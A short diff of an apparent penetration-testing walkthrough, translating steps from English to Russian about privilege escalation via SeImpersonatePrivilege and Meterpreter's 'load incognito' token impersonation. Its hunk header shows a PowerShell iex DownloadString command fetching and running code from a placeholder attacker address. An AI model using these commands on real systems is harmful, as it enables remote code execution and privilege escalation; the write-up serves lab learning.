@@ -108,9 +108,9 @@ powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-po
 
 <img src="https://i.imgur.com/zaqoz9K.png"/>
 
-Here we can escalate our privleges through `SeImpersonatePrivilege`
+Здесь мы можем повысить наши привилегии с помощью `SeImpersonatePrivilege`.
+Запустив команду `load incognito`, с помощью этого модуля мы можем выдавать себя за токены:
 
-Run the command `load icognito` through this module we can impersonate tokens
 
 <img src="https://imgur.com/IbKIzYL.png"/>
 
